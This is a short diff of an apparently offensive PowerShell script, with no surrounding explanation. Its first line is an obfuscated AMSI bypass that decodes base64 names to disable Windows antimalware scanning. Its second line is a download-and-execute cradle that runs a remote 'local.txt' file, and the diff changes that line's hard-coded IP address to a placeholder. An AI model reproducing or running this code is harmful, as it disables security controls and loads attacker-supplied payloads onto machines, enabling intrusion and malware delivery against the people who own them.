@@ -1,2 +1,2 @@
 [Ref].Assembly.GetType('System.Management.Automation.'+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBtAHMAaQBVAHQAaQBsAHMA')))).GetField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YQBtAHMAaQBJAG4AaQB0AEYAYQBpAGwAZQBkAA=='))),'NonPublic,Static').SetValue($null,$true)
-iex (new-object system.net.webclient).DownloadString('http://192.168.255.25/local.txt')
+iex (new-object system.net.webclient).DownloadString('http://*Ip-address*/local.txt')
